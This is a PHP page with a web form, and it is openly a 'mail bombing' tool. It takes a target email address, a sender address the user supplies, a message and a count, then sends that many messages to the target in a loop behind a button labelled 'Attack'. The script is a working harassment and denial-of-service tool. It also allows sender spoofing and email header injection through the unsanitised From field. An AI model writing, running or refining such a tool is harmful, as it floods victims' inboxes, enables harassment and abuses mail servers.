<?php

    if(isset($_GET["submit"])){
            if(isset($_GET["terget_mail"]) && isset($_GET["terget_mail"]) && isset($_GET["text"]) && isset($_GET["number"])){
   
               $to         =        $_GET["terget_mail"];
               $form       =        $_GET["your_mail"];
               $subject    =        "Mail Boombing";
               $body       =        $_GET["text"];
               $number       =      $_GET["number"];
               $headers = "From: {$form}" . "\r\n";
              $i = 1;
              while($i <= $number){
                mail($to,$subject,$body,$headers);
                $i++;
              }

           }else{
            echo "All requerd field";
        }
    }
    include("header.php");
?>

    <form action="" method="get">
        <label for="your_mail">Your Mail Address</label><br>
        <input type="email" name="your_mail" id="your_mail"><br><br>
        <label for="bombing_mail">Target Mail Address</label><br>
        <input type="email" name="terget_mail" id="bombing_mail"><br><br>
        <label for="text">Type your text</label><br>
        <textarea name="text" id="text" cols="30" rows="10"></textarea><br><br>
        <label for="number">Who many mail you want to send ?</label><br>
        <input type="number" name="number" id="numebr"><br><br>
        <input type="submit" name="submit" value="Attack">
    </form>




<?php
    include("footer.php");
?>